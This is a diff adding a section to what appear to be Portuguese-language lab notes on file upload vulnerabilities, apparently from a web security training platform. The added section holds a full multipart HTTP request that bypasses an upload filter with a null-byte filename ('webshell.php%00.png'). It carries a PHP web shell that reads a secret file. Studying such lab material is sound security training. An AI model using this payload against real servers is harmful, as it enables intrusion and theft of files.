@@ -210,4 +210,22 @@ t4wvyamnWaFWHez4TJd9SQxZUXxYSLI6
 ------WebKitFormBoundaryid3hJcJV3tX9G7VB--
 ````
 
-### >> 5. 
+### >> 5. Web shell upload via obfuscated file extension
+
+Crie uma requisição com o nome do arquivo modificado para atender os requisitos
+````http
+------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
+Content-Disposition: form-data; name="avatar"; filename="webshell.php%00.png"
+Content-Type: application/octet-stream
+
+ <?php echo file_get_contents('/home/carlos/secret'); ?> 
+------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
+Content-Disposition: form-data; name="csrf"
+
+Ra1gXgVnwyebhHPsi3FWWSNBfY14epng
+------WebKitFormBoundary2NUJ0mu3fL0Qhb2U--
+````
